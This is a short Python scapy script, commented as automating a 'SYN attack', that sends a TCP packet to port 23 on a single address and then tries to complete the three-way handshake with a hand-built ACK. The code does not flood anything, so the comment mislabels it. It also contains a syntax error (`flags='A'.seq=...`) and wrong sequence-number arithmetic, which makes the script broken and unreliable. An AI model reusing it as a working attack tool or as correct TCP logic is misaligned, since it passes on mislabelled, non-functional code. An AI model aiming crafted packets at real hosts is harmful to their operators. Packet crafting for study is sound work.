# This python program to automate SYN attack using scapy
from scapy.all import *

ip_pack=IP(dst='198.51.100.1')
tcp1=TCP(sport=444,dport=23)
packet1=(ip_pack/tcp1)
print('Packet structure of the first packet packet in 3 way handshake:')
print(packet1.show())
print('\n\nSending first packet and receiving second packet from 198.51.100.1...')
sendx=sr1(packet1)
my_ack=sendx.seq+1
my_seq=sendx.ack+1
tcp2=TCP(sport=444,dport=23,flags='A'.seq=my_seq,ack=my_ack)
packet2=(ip_pack/tcp2)
print('\n\nSending third packet of 3 way handshake..........')
sendy=send(packet2)
print('The structure third packet in 3 way handshake:')
print(packet2.show())
